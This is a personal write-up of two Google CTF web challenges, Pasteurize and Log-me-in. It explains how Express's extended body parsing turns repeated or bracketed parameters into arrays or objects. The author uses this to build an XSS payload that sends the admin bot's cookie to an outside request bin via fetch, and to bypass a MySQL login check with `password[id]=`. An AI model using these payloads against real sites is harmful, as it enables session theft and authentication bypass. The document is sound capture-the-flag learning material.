This year was actually my second trial at [google CTF](https://capturetheflag.withgoogle.com/). Last year I was not able to solve any challenges at all, so my goal this year was to collect at least one flag. Thus, I decided to start with the most solved challenge(probably was 50+) at the moment I first checked in: Pasteurize. I however spent too much time in it and managed to solve only 2 challenges before the end of the CTF: Pasteurize and Log-me-in.

# Pasteurize

## Challenge description:

The site [pasteurize.web.ctfcompetition.com](https://pasteurize.web.ctfcompetition.com/) had a simple form titled "create new paste":

![image](https://user-images.githubusercontent.com/24471300/91630956-85d7e780-e9f5-11ea-8d03-3ee32b7a7bba.png)

Upon submission, I was redirected to a page with a hash/uid added to the original url and a paste had been created:

![image](https://user-images.githubusercontent.com/24471300/91631040-0bf42e00-e9f6-11ea-9f69-e756c2dde4e3.png)

Since what I posted was reflected and there was an option `share with TJMike`, I was pretty sure this was an XSS challenge. Upon inspecting the html source, I discovered two things:

1. An html comment `<!-- TODO: Fix b/1337 in /source that could lead to XSS -->` which not only ensured the XSS even more, but also hinted to `/source` url which revealed an express-js source code for the app:

    ```javascript
    const express = require('express');
    const bodyParser = require('body-parser');
    const utils = require('./utils');
    const Recaptcha = require('express-recaptcha').RecaptchaV3;
    const uuidv4 = require('uuid').v4;
    const Datastore = require('@google-cloud/datastore').Datastore;

    /* Just reCAPTCHA stuff. */
    const CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || 'site-key';
    const CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || 'secret-key';
    console.log("Captcha(%s, %s)", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);
    const recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {
    'hl': 'en',
    callback: 'captcha_cb'
    });

    /* Choo Choo! */
    const app = express();
    app.set('view engine', 'ejs');
    app.set('strict routing', true);
    app.use(utils.domains_mw);
    app.use('/static', express.static('static', {
    etag: true,
    maxAge: 300 * 1000,
    }));

    /* They say reCAPTCHA needs those. But does it? */
    app.use(bodyParser.urlencoded({
    extended: true
    }));

    /* Just a datastore. I would be surprised if it's fragile. */
    class Database {
    constructor() {
      this._db = new Datastore({
        namespace: 'littlethings'
      });
    }
    add_note(note_id, content) {
      const note = {
        note_id: note_id,
        owner: 'guest',
        content: content,
        public: 1,
        created: Date.now()
      }
      return this._db.save({
        key: this._db.key(['Note', note_id]),
        data: note,
        excludeFromIndexes: ['content']
      });
    }
    async get_note(note_id) {
      const key = this._db.key(['Note', note_id]);
      let note;
      try {
        note = await this._db.get(key);
      } catch (e) {
        console.error(e);
        return null;
      }
      if (!note || note.length < 1) {
        return null;
      }
      note = note[0];
      if (note === undefined || note.public !== 1) {
        return null;
      }
      return note;
    }
    }

    const DB = new Database();

    /* Who wants a slice? */
    const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
    .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

    /* o/ */
    app.get('/', (req, res) => {
    res.render('index');
    });

    /* \o/ [x] */
    app.post('/', async (req, res) => {
    const note = req.body.content;
    if (!note) {
      return res.status(500).send("Nothing to add");
    }
    if (note.length > 2000) {
      res.status(500);
      return res.send("The note is too big");
    }

    const note_id = uuidv4();
    try {
      const result = await DB.add_note(note_id, note);
      if (!result) {
        res.status(500);
        console.error(result);
        return res.send("Something went wrong...");
      }
    } catch (err) {
      res.status(500);
      console.error(err);
      return res.send("Something went wrong...");
    }
    await utils.sleep(500);
    return res.redirect(`/${note_id}`);
    });

    /* Make sure to properly escape the note! */
    app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
    const note_id = req.params.id;
    const note = await DB.get_note(note_id);

    if (note == null) {
      return res.status(404).send("Paste not found or access has been denied.");
    }

    const unsafe_content = note.content;
    const safe_content = escape_string(unsafe_content);

    res.render('note_public', {
      content: safe_content,
      id: note_id,
      captcha: res.recaptcha
    });
    });

    /* Share your pastes with TJMike🎤 */
    app.post('/report/:id([a-f0-9\-]{36})', recaptcha.middleware.verify, (req, res) => {
    const id = req.params.id;

    /* No robots please! */
    if (req.recaptcha.error) {
      console.error(req.recaptcha.error);
      return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);
    }

    /* Make TJMike visit the paste */
    utils.visit(id, req);

    res.redirect(`/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.`);
    });

    /* This is my source I was telling you about! */
    app.get('/source', (req, res) => {
    res.set("Content-type", "text/plain; charset=utf-8");
    res.sendFile(__filename);
    });

    /* Let it begin! */
    const PORT = process.env.PORT || 8080;

    app.listen(PORT, () => {
    console.log(`App listening on port ${PORT}`);
    console.log('Press Ctrl+C to quit.');
    });

    module.exports = app;
    ```

2. The 'paste' is not reflected directly to the DOM but into a javascript string assigned to a `note` variable, which is later added to the DOM after sanitizing it with DOMpurify as in this snippet:

    ```javascript
    const note = "test";
    const note_id = "c3beca3f-d2f3-4c25-964e-0052d96f3035";
    const note_el = document.getElementById('note-content');
    const note_url_el = document.getElementById('note-title');
    const clean = DOMPurify.sanitize(note);
    note_el.innerHTML = clean;
    note_url_el.href = `/${note_id}`;
    note_url_el.innerHTML = `${note_id}`;
    ```
    
## Quest (and the wrong rabbit-hole):

It was obvious I could not try something like `</script><script>alert(1)</script><script>` (to directly add another script tag) since the angle brackets were encoded in the backend by the `escape_string` function:

```javascript
/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

Also `"`(double quote) would be escaped as `\"`, so, there was no direct way to inject arbitrary javascript code.

So I tried the classic `<script>alert(1)</script>` payload just to see what went on. The DOMPurify actively removed it; fair enough, since it was a dangerous markup. I then tried a more safe html: `<img src="https://my-request-bin-url">` which got that DOMPurify-pass. I then sent it to TJMike and got a new request into my request-bin, apparently they were using apple-webkit based browser:

```
host: ...
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Pragma: no-cache
Referer: https://pasteurize.web.ctfcompetition.com/e50cc66b-a455-47f4-ffff-6e8ad80f369c
sec-ch-ua: 
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Connection: keep-alive
```

### The mXSS rabbit-hole:

I then checked the DOMPurify version used, which was `2.0.8` while the latest release was `2.0.12`. I then quickly assumed (which I probably shouldn't have :/): "Oh, It must be either a DOMPurify or a apple-webkit-specific bypass to get an mXSS executed" and thus entered the wrong rabbit hole of mXSS.

While I was trying to "master" a bunch of mXSS related articles, digging commits on DOMPurify repo and trying out payloads like `<img alt="<x" title="/><img src=url404 onerror=xss(0)>">` with practically no progress, I noticed that the number of solves was steadily increasing. This made me rethink my approach: "Should not be that complex. Maybe I am going the wrong way?".

### It hit me:

I then decided looking at the `escape_string` function once more. It basically converted the input into a json string(all double quotes in the input would be escaped) and then removed the first & last characters(double quotes) from it. What can possibly go wrong here? since our input is ensured to be a string... right? And then it hit me!

I remembered this query-parsing behavior of express-js I learnt from [one of redpwnCTF 2020 challenges](https://github.com/csivitu/CTF-Write-ups/tree/master/redpwnCTF%202020/web/tux-fanpage). So, when you have multiple instances of same-named params like `param=a&param=d`, express-js will automatically parse `param` as an array like `["a","d"]`(I later learnt the extended option in bodyParser confirmed the behavior as in:`app.use(bodyParser.urlencoded({
extended: true
}))`). I quickly intercepted the post request, changed the request-body to `content=;alert(1);&content=` and got back:

```javascript
const note = "";alert(1);",""";
```

So what happened was: `content` param was parsed as this array: `[";alert(1);",""]` which when jsonified remained the same and after removing first & last chars(square-brackets) became `";alert(1);",""` which got printed within the double-quotes. This was great, but there still was a parse-error in the script. I then tried commenting out the unwanted part(`",""";`) by sending `content=;alert(1);//&content=` via the post request-body which gave back:

```javascript
const note = "";alert(1);//",""";
```

And I successfuly got the alert popup and thus found the XSS vulnerability, it was only a matter of exploiting it now.

## Solution:

I made a post request with the request-body: `content=;fetch('https://my-request-bin-url/'%2bdocument.cookie);//&content=` which got redirected to `/34f99257-2915-4838-ffff-e21525fa5c05`. Then, I went to `https://pasteurize.web.ctfcompetition.com/34f99257-2915-4838-ffff-e21525fa5c05` and clicked on `share with TJMike` to XSS TJMike. I got a request with the stolen cookie `secret=CTF%7BExpress_t0_Tr0ubl3s%7D` into my request-bin. I thus got the flag after url-decoding the value in the cookie: `CTF{Express_t0_Tr0ubl3s}`.

# Log-me-in

## Challenge description:

The site [log-me-in.web.ctfcompetition.com](https://log-me-in.web.ctfcompetition.com/) had a navbar with menu-items: home, about, profile, flag and login.

![image](https://user-images.githubusercontent.com/24471300/91640429-374e3b80-ea3d-11ea-9503-882102acdd56.png)

Clicking on the flag button sent us to `/flag` route which popped up an error `You must be logged in to access that`. The `/login` route had a simple login form:

![image](https://user-images.githubusercontent.com/24471300/91652179-47553200-eab4-11ea-979e-f9bfb7ae8a80.png)

We were also provided with the express-js source code for the app:

```javascript
const mysql = require('mysql');
const express = require('express');
const cookieSession = require('cookie-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');

const flagValue = "..."
const targetUser = "michelle"

const {
v4: uuidv4
} = require('uuid');

const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);

/* strict routing to prevent /note/ paths etc. */
app.set('strict routing', true)
app.use(cookieParser());

/* secure session in cookie */
app.use(cookieSession({
name: 'session',
keys: ['...'] //don't even bother
}));

app.use(bodyParser.urlencoded({
extended: true
}))

app.use(function(req, res, next) {
if(req && req.session && req.session.username) {
  res.locals.username = req.session.username
  res.locals.flag = req.session.flag
} else {
  res.locals.username = false
  res.locals.flag = false
}
next()
});

/* server static files from static folder */
app.use('/static', express.static('static'))

app.use(function( req, res, next) {
if(req.get('X-Forwarded-Proto') == 'http') {
    res.redirect('https://' + req.headers.host + req.url)
} else {
  if (process.env.DEV) {
    return next()
  } else  {
  return next()
  }
}
});
// MIDDLEWARE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

/* csrf middleware, csrf_token stored in the session cookie */
const csrf = (req, res, next) => {
const csrf = uuidv4();
req.csrf = req.session.csrf || uuidv4();
req.session.csrf = csrf;
res.locals.csrf = csrf;

nocache(res);

if (req.method == 'POST' && req.csrf !== req.body.csrf) {
  return res.render('index', {error: 'Invalid CSRF token'});
}

next();
}

/* disable cache on specifc endpoints */
const nocache = (res) =>a {
res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
res.setHeader('Pragma', 'no-cache');
res.setHeader('Expires', '0');
}

/* auth middleware */
const auth = (req, res, next) => {
if (!req.session || !req.session.username) {
  return res.render('index', {error:"You must be logged in to access that"});
}
next()
}

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
app.get('/logout', (req, res) => {
req.session = null;
res.redirect('/');
});


app.get('/', csrf, (req, res) => {
res.render('index');
});

app.get('/about', (req, res) => {
res.render('about');

});
app.get('/me', auth, (req, res) => {
res.render('profile');
});

app.get('/flag', csrf, auth, (req, res) => {
res.render('premium')
});

app.get('/login', (req, res) => {
res.render('login');
});

app.post('/login', (req, res) => {
const u = req.body['username'];
const p = req.body['password'];

const con = DBCon(); // mysql.createConnection(...).connect()

const sql = 'Select * from users where username = ? and password = ?';
con.query(sql, [u, p], function(err, qResult) {
  if(err) {
    res.render('login', {error: `Unknown error: ${err}`});
  } else if(qResult.length) {
    const username = qResult[0]['username'];
    let flag;
    if(username.toLowerCase() == targetUser) {
      flag = flagValue
    } else{
      flag = "<span class=text-danger>Only Michelle's account has the flag</span>";
    }
    req.session.username = username
    req.session.flag = flag
    res.redirect('/me');
  } else {
    res.render('login', {error: "Invalid username or password"})
  }
});
});
```

## Quest

 The `const targetUser = "michelle"` in the source hinted we were to somehow bypass the login to be authenticated as `michelle`. My first guess was sql injection but there was a prepared query used:

```javascript
app.post('/login', (req, res) => {
const u = req.body['username'];
const p = req.body['password'];

const con = DBCon(); // mysql.createConnection(...).connect()

const sql = 'Select * from users where username = ? and password = ?';
con.query(sql, [u, p], function(err, qResult) {
  if(err) {
    res.render('login', {error: `Unknown error: ${err}`});
  } else if(qResult.length) {
    const username = qResult[0]['username'];
    let flag;
    if(username.toLowerCase() == targetUser) {
      flag = flagValue
    } else{
      flag = "<span class=text-danger>Only Michelle's account has the flag</span>";
    }
    req.session.username = username
    req.session.flag = flag
    res.redirect('/me');
  } else {
    res.render('login', {error: "Invalid username or password"})
  }
});
});
```

I decided to play around with the post parameters anyways. A normal request with `username=michelle&password=michelle&csrf=` simply gave an error `Invalid username or password`. Since this app was also written in express-js, I thought of trying out the trick from "pasteurize" challenge here as well. I repeated the request with `username=michelle&password=michelle&password=extra&csrf=` which gave back a new error `Unknown error: Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ' 'extra' order by id' at line 1`. This confirmed similar behavior.

I then tried requesting with `username=michelle&password[0]=&csrf=` but it again gave the same old error `Invalid username or password` back. I repeated with `username=michelle&password[r]=&csrf=` and got back `Unknown error: Error: ER_BAD_FIELD_ERROR: Unknown column 'r' in 'where clause'`. Bingo! I was then able to login by simply replacing `r` with `id`(or any existing column). The password parameter `password[id]=` was being parsed as an object(something like `{id:null}`) which somehow bypassed the password check in the prepared query.

## Solution

I simply sent a post request via burp repeater to `/login` route with the body `username=michelle&password[id]=&csrf=`. This gave a 302/redirect response(unlike other requests which gave a 200/no-redirect). The response also (re)set the `session` cookie `Set-Cookie: session=eyJjc3JmIjoiYjU3OWM2MWYtNjhmMi00YTIzLWFkYzgtNzAxODE3YTU1YWIzIiwidXNlcm5hbWUiOiJtaWNoZWxsZSIsImZsYWciOiJDVEZ7YS1wcmVtaXVtLWVmZm9ydC1kZXNlcnZlcy1hLXByZW1pdW0tZmxhZ30ifQ==; path=/; httponly`. I was thus able to extract the flag from the base-64-decoded cookie: `CTF{a-premium-effort-deserves-a-premium-flag}`.